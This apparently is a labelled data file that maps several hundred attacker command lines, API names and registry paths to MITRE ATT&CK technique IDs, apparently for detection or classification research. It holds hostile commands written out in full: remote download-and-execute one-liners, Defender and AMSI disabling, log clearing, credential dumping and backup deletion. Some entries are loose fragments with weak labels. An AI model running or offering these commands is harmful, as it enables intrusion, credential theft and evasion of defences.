& curl.exe -L $url --output $toolsDir,T1113
Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami},T1021
service pf disable,T1562
"%LOCALAPPDATA:~-3,1%md /c echo $input_message > $output_file & type $output_file",T1059
ExchangePowerShell,T1070
dscl . -create /Users/AtomicUser UserShell /bin/bash,T1078
"New-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows Script\Settings"" -Name ""AmsiEnable"" -Value 0 -PropertyType DWORD -Force | Out-Null",T1562
System.Security.AccessControl,T1087
"copy ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" $env:temp",T1569
"wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\""Event[System[(EventID=4776)]]""'",T1087
"rundll32.exe pcwutl.dll,LaunchApplication $exe_to_launch",T1218
dlsym,T1129
esxcli system account list,T1087
"odbcconf.exe /S /A &lbrace;REGSVR ""C:\Users\Public\file.dll""&rbrace;",T1218
HKLM\System\CurrentControlSet\services\TermService\Parameters\,T1505
OpenEventLogW,T1070
osascript $scriptfile,T1547
LoadLibrary(),T1027
echo $fish_encoded | b64decode -r | sh,T1140
. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1 \nSyncInvoke {CMD},T1216
"python3 -c ""from base64 import b64decode;dec=b64decode(\""$ENCODED\"");print(dec.decode())""",T1140
HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier},T1547
.avos2,T1486
cmd.exe /c eventvwr.msc,T1548
Write-Host 1.Downloading KeyScrambler from official website to temp directory,T1574
GetKeyboardLayoutList,T1614
sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true,T1564
"Write-Host "" [-] Attempting ${password} on account $username.""",T1110
/var/log/httpd/,T1070
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f",T1112
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services,T1112
diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},T1105
"if [ ""$HISTCONTROL"" != ""erasedups"" ]; then export HISTCONTROL=""erasedups""; fi",T1562
update-ca-trust,T1553
GetAdaptersInfo,T1016
Set-MpPreference -DisableScriptScanning 1,T1562
msiexec,T1218
start ms-appinstaller://?source={REMOTEURL:.exe},T1105
"Set-ItemProperty -Path $RunKey -Name ""socks5_powershell"" -Value ""$reg_key_value""",T1547
CRYPTO::Extract,T1552
ServiceDll,T1505
"kldstat | grep -i ""vbox""",T1082
C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe,T1036
describe volume,T1680
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll,T1546
findstr /V /L W3AllLov3DonaldTrump $path\procexp.exe > $path\file.txt:procexp.exe,T1564
"write-host ""Remote download of SharpHound.ps1 into memory, followed by execution of the script"" -ForegroundColor Cyan",T1059
"cscript.exe ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""",T1547
"copy ""$Path_inf"" %TEMP%\ieuinit.inf",T1218
"Add-Type -MemberDefinition '[DllImport(""user32.dll"")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;",T1113
first_run(),T1082
Uninstall,T1012
"""c:\Program Files\Wireshark\tshark.exe"" -i $interface -c 5",T1040
"New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView""",T1562
%systemdir%\,T1546
sc.exe delete $service_name,T1569
Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Roaming\Microsoft\Credentials\,T1552
net user >> %temp%\download,T1087
Microsoft.Compute/restorePointCollections/delete,T1490
"echo ""$command"" > /etc/cron.hourly/$cron_script_name",T1053
netscan.exe,T1046
NSAppleScript,T1059
GetCurrentHwProfile,T1106
"powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','$url',$False);$comMsXml.Send();IEX $comMsXml.ResponseText""",T1059
[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale,T1614
rem reg query,T1012
attrib.exe +h $file_or_folder\T1222.001_attrib1.txt,T1222
defaults write com.apple.finder AppleShowAllFiles YES,T1564
CreateFileW(),T1106
LOGONSERVER,T1082
LdrLoadDll(),T1027
"New-ItemProperty -Path ""HKLM:\Software\Microsoft\Command Processor"" -Name ""AutoRun"" -Value ""$command"" -PropertyType ""String""",T1546
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language,T1614
ECHO Let's run the schedule task ...,T1053
dotnet -h > nul,T1574
net user Administrator,T1087
C:\\Windows\\System32\\Werfault.exe,T1055
__tutmc,T1071
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate,T1016
"control.exe ""$cpl_file_path""",T1218
"reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 1 /f",T1548
chmod g+xs $file_to_setuid,T1548
"Copy-Item ""$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb"" C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb",T1546
taskkill.exe /f /im $process_name,T1489
HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe,T1497
domainpassspray -consoleoutput -noninteractive -emptypasswords,T1110
.vmdk,T1680
regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll,T1218
"if [ -z ""${FILE}"" ] ; then echo ""No loginwindow plist file found"" && exit 1 ; fi",T1547
sc query state= all,T1007
certreq.exe -Post -config $remote_file c:\windows\win.ini $local_path,T1105
xattr -d com.apple.quarantine $app_path,T1553
echo '}' >> $rc_service_path/$rc_service_file,T1543
regkeyenum,T1012
Set-OabVirtualDirectoryPowerShell,T1059
DeviceIoControl,T1106
"msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo",T1127
netsh.exe firewall show config,T1518
regsvr32.exe /s /i,T1218
dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext},T1105
spoolvulnscan -noninteractive -consoleoutput,T1046
wscript,T1059
squirrel.exe --download {REMOTEURL},T1218
"Get-Process -Name ""EDR-Freeze_1.0"" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue",T1562
echo '# PROVIDE: art-test' >> $rc_service_path/$rc_service_file,T1543
testcat /etc/shadow,T1003
mofcomp.exe,T1546
msSaveBlob,T1027
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose,T1069
foreach($fileShare in $fileShares) {,T1619
C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt,T1036
CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name,T1614
MicroNativeCacheSvc,T1547
tracert,T1016
Invoke-CimMethod -ClassName Win32_Product -MethodName $action -Arguments @{ PackageLocation = '$msi_payload' },T1218
".\kerbrute.exe bruteforce --dc $domaincontroller -d $domain ""PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt""",T1110
esxcli network ip interface ipv4 get,T1016
who -a,T1049
"sc sdset $service_name ""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)""",T1564
msbuild.exe {PATH:.csproj},T1127
clang $input_file && ./a.out,T1027
ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd',T1518
RECYCLE.BIN,T1564
public const int SE_PRIVILEGE_ENABLED = 0x00000002;,T1562
"$env:AWS_ACCESS_KEY_ID = ""$awsAccessKey""",T1567
MSExchangeIS,T1489
%APPDATA%\microsoft\word\startup\,T1137
msiexec /i $installer /qn,T1219
"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f",T1546
SIGINT,T1564
touch $file_to_modify,T1222
"wmic /Node:localhost /Namespace:\\root\Microsoft\Windows\Defender Path MSFT_MpPreference Get /format:list | findstr /i /C:""DisableRealtimeMonitoring"" /C:""ExclusionPath"" /C:""ExclusionExtension"" /C:""ExclusionProcess""",T1518
reg add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f,T1112
show ip route,T1016
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAVolume /t REG_DWORD /d 1 /f",T1112
net config,T1016
"Move-Item -Force ""\\$target\c$\ticket.kirbi"" ticket.kirbi",T1550
"cscript.exe ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""",T1547
rundll32.exe -sta {CLSID},T1218
Chrome Update,T1036
netsh wlan show profile “Wi-Fi name” key=clear,T1016
reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64,T1012
CMLuaUtil,T1559
cat ~/Library/Keychains/login.keychain-db > $keychain_export,T1555
Get-AcceptedDomain,T1482
echo too many secrets > $folder_name\$hidden_filename,T1564
echo $ENCODED > $encoded_file && b64encode -r $encoded_file,T1140
.pdf.lnk,T1036
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor"" /v ""AllowSecondaryAuthenticationDevice"" /t REG_DWORD /d 0 /f",T1112
"ls -la $HISTFILE # "" ls -la $HISTFILE""",T1562
sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist,T1562
do {,T1539
"} | Sort-Object State,Process | Format-Table -AutoSize",T1049
"$web_client.Credentials = New-Object System.Net.NetworkCredential('$username', '$password')",T1048
"Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' ""/S""",T1219
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced,T1112
cmd.exe /K %APPDATA%\taskhostw.exe,T1036
python3 $lazagne_path/laZagne.py $specific_module >> $output_file,T1555
reg add HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f,T1112
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableBehaviorMonitoring"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
cd $env:TEMP,T1562
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoLogOff /t REG_DWORD /d 1 /f",T1112
touch $file_to_setcap,T1548
Start-Sleep -Seconds 1,T1202
echo T1222.001_attrib2 >> $file_or_folder\T1222.001_attrib2.txt,T1222
chown,T1222
cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt,T1218
echo.,T1558
ExecReload,T1543
sudo launchctl load -w /Library/LaunchDaemons/$plist_filename,T1543
"conhost.exe ""$process""",T1202
wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs,T1082
gcloud iam service-accounts keys create,T1098
Get-GlobalAddressList,T1087
.tmpl,T1036
Start-Sleep 1 # wait a bit so the output file has time to be created,T1558
/dclist,T1018
fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE},T1485
HKCU\Software\Microsoft/Windows\CurrentVersion\RunOnce,T1547
TracerPID,T1622
RunAtLoad,T1543
$which_openssl rsautl -encrypt -inkey $public_key_path -pubin -in $input_file_path -out $encrypted_file_path,T1486
sh $script_path,T1003
rm $history_path,T1070
Invoke-WebRequst,T1059
_objec_msgSend(),T1129
"import-module ""PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1""",T1110
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore,T1558
sudo dscl . -create /Users/$user_name IsHidden 1,T1564
reg add HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f,T1112
Pester.bat ;{PATH:.exe},T1216
"Write-Host ""PID: $($process.Id)""",T1562
wermgr.exe,T1055
"(gwmi -list win32_shadowcopy).Create('$drive_letter','ClientAccessible')",T1003
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f",T1484
ProcessList,T1057
Ldifde -i -f {PATH:.ldf},T1105
squirrel.exe --update {REMOTEURL},T1218
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyEnable /t REG_DWORD /d 1 /f",T1112
HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers,T1070
chmod u+xs $file_to_setuid,T1548
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL"" /ve /T REG_SZ /d ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct"" /f",T1546
"Write-Host ""The content is $fileContent""",T1560
execvp,T1106
"Get-ChildItem -Path ""HKLM:system\currentcontrolset\services""",T1012
{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1},T1546
Platypus,T1480
aws cloudtrail stop-logging --name $cloudtrail_name --region $region,T1562
File.txt.exe,T1036
cd ~/Library/Cookies,T1555
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1],T1059
sudo $program_path -i $ifname -t 3,T1040
libevent,T1546
"if ($sp -eq $null) { Write-Warning ""Service Principal not found""; exit }",T1098
admin ALL=(ALL) NOPASSWD: ALL,T1548
Microsoft.CSharp.CSharpCodeProvider,T1027
"Set-Location ""PathToAtomicsFolder\..\ExternalPayloads""",T1550
reg add HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f,T1112
wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer,T1218
"else {$responseBody = ""The storage account could not be anonymously accessed.""}}",T1619
"Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""",T1110
Stop-Service -Name $service_name,T1562
Start-Process -Wait $file1 /quiet;,T1219
cp -R ~/Library/Mail/* ~/Library/Mail/copy,T1070
shareenumeration -noninteractive -consoleoutput,T1135
echo,T1007
cd %temp%,T1558
aws guardduty update-detector --no-enable --detector-id $detectorId,T1562
0xFF 0xD8,T1036
useradd --create-home --shell /bin/bash art,T1546
base64,T1027
WaitForSingleObject,T1106
New-Item -type Directory $ExcelRegPath -Force | Out-Null,T1137
New-Item -Path $filePath -ItemType File -Force,T1105
HKCU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32,T1546
control.exe {PATH_ABSOLUTE:.cpl},T1218
Remove-FileShare -Name $share_name,T1070
%PROGRAMFILES%,T1547
sudo log erase --all,T1070
[kworker:0/1],T1036
Get-ComputerInfo,T1082
powershell -Command exit,T1546
sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf,T1562
CPlApplet,T1218
"New-ADUser -Name $account -GivenName ""Test"" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False $create_args",T1098
VirtualProtectEx,T1055
echo $sh_encoded | b64decode -r | sh,T1140
try { Invoke-BloodHound -OutputDirectory $env:Temp },T1059
WerFault.exe,T1003
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic,T1547
wmic useraccount get /ALL /format:csv,T1047
bash.exe,T1218
date.exe,T1036
/etc/udev/rules.d/,T1546
"Write-Host ""[i] Using Interface $interface""",T1046
"rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}",T1218
certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe},T1105
takeown /F C:\Windows\System32\Narrator.exe /A,T1546
C:\Programdata\Microsoft\,T1074
wdm,T1547
KCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemTextEncoding,T1547
/uploads,T1082
Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess,T1098
systemctl stop,T1569
"for bucket in ""$(aws s3 ls | cut -d "" "" -f3)""; do aws s3api list-objects-v2 --bucket $bucket --output text; done",T1619
BeingDebugged,T1622
wind0ws,T1547
mmc wbadmin.msc delete catalog -quiet,T1218
requestbin.net,T1071
"Write-Output ""Found table: $($table)""",T1619
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce*aster = %Public%\enc.exe,T1547
if ($new) {,T1484
"cscript.exe /E:Jscript ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""",T1547
debug.exe,T1036
[System.ComponentModel.RunInstaller(true)],T1218
"New-ItemProperty -Path HKLM:\Software\Microsoft\.NETFramework -Name ETWEnabled -Value 0 -PropertyType ""DWord"" -Force",T1562
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options,T1546
replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A,T1105
Invoke-DOSfucation,T1027
Invoke-ATHHTMLApplication -ScriptEngine $script_engine -InlineProtocolHandler $protocol_handler -MSHTAFilePath $mshta_file_path,T1218
"New-ItemProperty -Path HKCU:\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType ""String"" -Force",T1562
ReadFile,T1106
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""delete {GUID}"" ""quit"" ""quit""",T1003
"Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt"" -officeProduct ""$ms_product"" -sub ""Exploit""",T1055
cat /etc/security/pwquality.conf,T1201
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Micromedia,T1547
"$var.content|out-file ""$temp_file""",T1218
%APPDATA%\Microsoft\Windows\Recent,T1083
"reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v DontShowUI /t REG_DWORD /d 1 /f",T1112
/api/v1/cav/client/visits,T1071
Runonce.exe /AlternateShellStartup,T1218
cmd /c systeminfo > %temp%\ temp.ini,T1082
try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop },T1018
LastAccessTime,T1070
DiskCleanup,T1574
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\$remote_host -i -u $user_name -p $password -accepteula ""C:\Windows\System32\calc.exe""",T1569
"Write-Host ""App permission $permission not found in the Graph Resource API"" -ForegroundColor Red",T1098
tasklist.exe | findstr /i cb,T1518
sudo chown root /tmp/hello,T1548
if (-not $edrFreezeExeName) {,T1562
"Stop-Process -Name ""PowerPnt"" -ErrorAction Ignore",T1137
pw adduser art -g wheel -s /bin/sh,T1110
usermod,T1098
"Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Features"" -NoRestart -ErrorAction Ignore",T1562
"c:\windows\system32\cmd.exe /c cd /d $script_path & echo Set objShell = CreateObject(""WScript.Shell""):Set objExec = objShell.Exec(""whoami""):Set objExec = Nothing:Set objShell = Nothing > $script_name.vbs & $script_name.vbs",T1059
cat $File_to_output,T1083
ls -al /Applications,T1082
HKCR\.enc,T1112
net share $share_name /delete,T1070
HKLM\SYSTEM\CurrentControlSet\services\\[service_name]\\Start,T1112
C:\ProgramData,T1074
Remove-Item $fname,T1204
ZwRaiseHardError,T1529
and require utilities such as,T1564
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit,T1547
{12d61a41-4b74-7610-a4d8-3028d2f56395},T1480
shutdown,T1529
"Write-Host -ForegroundColor Green ""Password found for User:$User Password:$Password""",T1110
"/proc/""process_name""/cmdline",T1083
UltraVNC.exe,T1036
show ip interface,T1016
if (-not (Test-Path -Path $fileSharePath)) {,T1530
ChangeServiceConfigW,T1489
"& ""$TempDir\env\Scripts\python.exe"" -c ""print('Triggering Hook via atomic_hook...')""",T1546
. ~/.bashrc,T1070
net user /dom,T1087
LZCopy,T1140
"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}",T1218
echo $(echo $ENCODED) | xxd -r -p,T1140
New-Item $rclone_config_path\rclone -ItemType directory,T1567
wevtutil cl system,T1070
sudo cat /etc/master.passwd > $output_file,T1003
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}"" /f",T1546
FindNextUrlCacheEntryA,T1106
"& ""PathToAtomicsFolder\T1055\bin\x64\RWXinjectionLocal.exe"" ""$vuln_dll"" $address",T1055
"echo ""# Short Description: Atomic Test for Systemd Service Creation"" >> /etc/init.d/T1543.002",T1543
certutil -decodehex {PATH:.hex} {PATH},T1140
"wuauclt.exe /UpdateDeploymentProvider ""$arbitrary_dll"" /RunHandlerComServer",T1218
plutil -p ${FILE},T1547
"New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""",T1546
nltest.exe /dclist:$target_domain,T1018
cmstp.exe /ni /s {PATH_ABSOLUTE:.inf},T1218
software\microsoft\windows\currentversion\run\microsoft windows html help,T1547
./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force,T1562
"echo GetObject(""script:{REMOTEURL:.js}"") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js",T1564
New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki,T1564
"copy ""$ps1_path"" %temp%\T1036.007_masquerading.pdf.ps1 /Y",T1036
HKCU\Software\Microsoft\Windows\Run,T1547
hack,T1564
"$sheet.Cells.Item(23,1) = ""=HALT()""",T1204
dir $input_file -Recurse | Compress-Archive -DestinationPath $output_file,T1560
ip ssh pubkey-chain,T1098
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null,T1204
"devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test",T1127
New-GPOImmediateTask,T1484
--init,T1036
ScriptRunner.exe -appvscript {PATH_SMB:.cmd},T1218
truncate -s0 $history_path,T1070
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"" /v ""DoNotConnectToWindowsUpdateInternetLocations"" /t REG_DWORD /d 1 /f",T1112
"""$mimikatz_exe"" ""crypto::certificates /systemstore:local_machine /store:my /export"" exit",T1552
"import-module ""$file_path\timestomp.ps1""",T1070
"FileShareName = """"",T1619
'./testdirwithspaceend /init ',T1036
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\,T1546
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f",T1112
net use \\system\share /delete,T1070
EnumResourceTypesA,T1106
ldifde.exe -f $output_path\$output_file -p subtree,T1069
Compress-Archive,T1560
File,T1562
"Write-Host ""The registry value '$registryValue' already exists with the required setting.""",T1137
HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID},T1553
Get-Content $env:TEMP\golden.txt,T1558
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"" /t REG_SZ /d ""PathToAtomicsFolder\T1137.002\bin\officetest_x86.dll"" /f",T1137
netsh wlan show profiles,T1016
"sudo security add-trusted-cert -d -r trustRoot -k ""/Library/Keychains/System.keychain"" ""$cert_filename""",T1553
"rmdir %temp%\lolbin /s /q 2>nul & mkdir ""%temp%\lolbin\Windows Media Player"" & copy C:\Windows\System32\calc.exe ""%temp%\lolbin\Windows Media Player\wmpnscfg.exe"" >nul && cmd /V /C ""set ""ProgramW6432=%temp%\lolbin"" && unregmp2.exe /HideWMP""",T1202
InvocationMethod = 'Executable',T1218
"public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);",T1562
if ((${#HISTFILE[@]})); then echo $HISTFILE; fi,T1562
$PYTHON $python_script $PID $output_file,T1003
esxcli network diag ping,T1018
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce,T1012
which_python=`which python || which python3`,T1560
Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile $extract_path\ntds.dit,T1003
"az storage file upload --account-name ""$storage_account_name"" --share-name ""$file_share_name"" -p ""$file_path"" --source $tmpFunctionCode --only-show-errors",T1528
"Start-Process -FilePath ""$autohotkey_path"" -ArgumentList ""$script_path""",T1059
HKEY_LOCAL_MACHINE,T1027
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot,T1012
LoadLibraryA,T1106
echo Password1> passwords.txt,T1110
SetThreadContext,T1055
WSearch,T1543
%<malware_execution_folder>%\\CrashLog.txt,T1074
sudo systemctl stop systemd-journald #disables journal logging,T1562
"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f",T1546
httpsvc,T1543
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce,T1060
"Write-Output ""Found container: $($container)""",T1619
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType $command_line_switch_type -CommandParamVariation $command_param_variation -Execute -ErrorAction Stop,T1059
"If ($domain_sid -Match ""DEFAULT"") {",T1558
"az storage file download --account-name ""$storage_account_name"" --share-name ""$file_share_name"" -p ""$file_path"" --only-show-errors --dest $tmpOriginalFunctionCode",T1528
"if $(env |grep ""SHELL"" >/dev/null); then env |grep ""SHELL""; fi",T1059
"$History | Out-File -FilePath ""$Env:USERPROFILE\Downloads\chromebrowsinghistory.txt""",T1217
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""DllName"" ""$binary_to_execute"" -Type ExpandString -Force",T1547
Restart-Service -Name EventLog -Force -ErrorAction Ignore,T1562
DYLD_LIBRARY_PATH,T1574
"nscurl -k ""$remote_file"" -o ""$destination_path""",T1105
libc,T1574
GetVolumePathNamesForVolumeNameW(),T1083
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScriptScanning"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
ufw logging off,T1562
/System/Library/LaunchDaemons/com.apple.emond.plist,T1546
C:\inetpub\wwwroot\aspnet_client\system_web\IISpool.aspx,T1105
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Security,T1562
CreatePolicyVersion,T1098
Notepad.exe,T1055
"Start-Process -FilePath ""$env:comspec"" -ArgumentList ""/c,type,$payload_path,>,`""$ads_file_path:$ads_name`""""",T1564
HKLM\Software\Microsoft\Windows\CurrentVersion\spreadCpuXmr – %stratum info%,T1012
foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue),T1083
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v ShellSmartScreenLevel /t REG_SZ /d Block /f",T1484
Finder,T1564
dscl . list /Groups,T1087
timestamp_timeout,T1548
HKLM\SECURITY\Policy\Secrets\*\OldVal,T1003
Locale Name,T1614
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=group) $optional_args",T1069
utime,T1070
Microsoft.Storage/storageAccounts/listkeys/action,T1552
wmic,T1047
"rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",T1218
"echo 'echo ""Hostname: $(hostname)""' >> /tmp/art_payload.sh",T1027
"copy ""$exe_path"" %temp%\T1036.007_masquerading.ps1.exe /Y",T1036
Sysutils::DiskSize,T1680
certutil -verifyctl -split -f $remote_file,T1105
/var/logs,T1070
"invoke-expression 'cmd /c start powershell -Command {cmd /c ""$TorExe""}'",T1090
aws iam list-roles,T1087
PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,T1562
kinit,T1558
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no,T1490
show configuration,T1082
DisplayName = $p.DisplayName,T1007
Sbiedll.dll,T1497
"if (""$execution_option"" -eq ""insert_code"") {",T1528
OINFO12.OCX,T1574
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk,T1490
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableIOAVProtection"" -Value 1",T1562
"Get-Process | Select ProcessName,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}}",T1134
cat /etc/pam.d/passwd,T1201
"$ShortCut.WorkingDirectory = ""C:\Windows\System32"";",T1547
"New-ItemProperty -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute""",T1548
SeBackupPrivilege,T1134
"Set objws = CreateObject(""Wscript.Shell"")",T1546
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders,T1060
